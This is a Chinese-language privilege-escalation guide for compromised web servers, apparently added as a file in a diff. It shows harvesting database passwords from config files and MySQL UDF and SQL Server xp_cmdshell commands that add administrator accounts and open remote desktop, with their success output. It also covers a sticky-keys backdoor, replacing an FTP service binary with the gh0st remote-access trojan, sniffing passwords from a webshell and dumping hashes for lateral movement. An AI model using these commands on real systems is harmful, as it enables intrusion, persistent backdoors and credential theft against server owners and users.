@@ -1,0 +1,113 @@
+1.查找配置文件 ，翻阅网站目录下的 config.asp config.php conn.asp inc目录查找 具有高权限的账号和密码
+
+    比如说： root 密码 SA的密码。
+
+    // [CH] 以下变量请根据空间商提供的账号参数修改，如有疑问，请联系服务器提供商
+
+    $dbhost = 'localhost';
+
+    // 数据库服务器
+
+    $dbuser = 'root';
+
+    // 数据库用户名
+
+    $dbpw = '123';
+
+    // 数据库密码
+
+    $dbname = 'discuz';
+
+    // 数据库名
+
+    $pconnect = 0;
+
+    // 数据库持久连接 0=关闭， 1=打
+
+    得到root 帐户密码：
+
+    root
+
+    123
+
+    利用MySQL root 提权
+
+    DLL已成功的导出到c:\\windows\\system32\\mysqlDll_1269695183.dll
+
+    Function 'state' already exists
+
+    select state（“net user yhsafe yhsafe /add”）
+
+    SQL语句成功执行：Resource id #2
+
+    Array
+
+    （
+
+    [0] => 命令成功完成。
+
+    succeed!
+
+    [state（“net user yhsafe yhsafe /add”）] => 命令成功完成。
+
+    succeed!
+
+    ）
+
+    利用 SA来提权
+
+    server=localhost;UID=saWD=123;database=masterrovider=SQLOLEDB
+
+    执行xp_cmdshell 假如没有，记得先恢复xp_cmdshell
+
+    Exec master.dbo.xp_cmdshell 'net user yhsafe.com yhsafe /add'
+
+    Exec master.dbo.xp_cmdshell 'net localgroup administrators yhsafe.com /add'
+
+    开启3389：
+
+    Exec master.dbo.xp_cmdshell 'C:\inetpub\wwwroot\bbs\3389.exe 3389'
+
+    返回结果：
+
+    Now opening terminate service…success!
+
+    5.2
+
+    OK…
+
+    开启成功
+
+    2.利用一些软件配置漏洞，或者本地溢出来进行提权。
+
+    “巴西烤肉”提权：
+
+    webshell下执行 ch.exe “net user 123 123 /add”
+
+    360提权：
+
+    360.exe 3389 //这样的话就开启了远程桌面
+
+    按5下shift 就出弹出CMD
+
+    3.替换服务法
+
+    C:\ftp\FtpServer.exe
+
+    对FtpServer.exe 重命名为 FtpServer1.exe
+
+    上传一个反弹的远程控制程序。比方 gh0st
+
+    gh0st 重命名为FtpServer.exe
+
+    4.打破常规用webshell来进行sniffer
+
+    能sniffer到整个服务器的FTP HTTP这类密码。
+
+    需要用到Wireshark 专业工具来查看密码。
+
+    5.dump 密码
+
+    dump 需要administrator 甚至 system权限
+
+    dump出hash 进而对内网进一步渗透
